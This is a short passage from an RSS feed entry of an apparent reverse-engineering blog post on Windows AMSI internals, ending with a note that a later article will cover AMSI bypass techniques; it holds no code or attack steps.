that &lt;code&gt;r15&lt;/code&gt;, which acts as the counter loaded into &lt;code&gt;r13&lt;/code&gt; previously. What this is checking is that if
anything malicous detected before going through all the providers.&lt;/p&gt;
&lt;p&gt;Now it is time to conclude our assumptions on AmsiInitialize.&lt;/p&gt;
&lt;h2 id=&#34;amsiinitialize&#34;&gt;AmsiInitialize&lt;/h2&gt;
&lt;h1 id=&#34;the-end&#34;&gt;The End&lt;/h1&gt;
&lt;p&gt;So yeah that&amp;rsquo;s it for now&amp;hellip; we explored AMSI in-depth in this article. In the next one, We will go through some
common AMSI bypass
techniques.&lt;/p&gt;
&lt;p&gt;#Spread Anarchy!&lt;/p&gt;
</content>
>>>>>>> tmp
    </item>
    
  </channel>
</rss>
